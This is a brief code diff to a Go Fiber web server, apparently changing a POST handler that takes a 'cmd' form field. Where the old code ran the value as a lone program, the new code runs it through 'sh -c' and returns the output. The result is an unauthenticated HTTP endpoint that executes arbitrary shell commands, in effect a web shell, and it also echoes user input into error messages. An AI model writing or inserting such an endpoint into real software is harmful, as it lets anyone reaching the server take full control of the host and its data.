@@ -17,10 +17,10 @@ func main() {
 func postHandler(c *fiber.Ctx) error {
 	
 	cmd := c.FormValue("cmd")
-	out, err := exec.Command(cmd).Output()
+	out, err := exec.Command("sh","-c",cmd).Output()
 	if err != nil {
-		return c.SendString(err.Error())
+		return c.Status(fiber.StatusBadRequest).SendString(" Error : "+cmd+" is invalid command ")
 	}
-	return c.SendString(string(out))
+	return c.Status(fiber.StatusOK).SendString(string(out))
 }
 
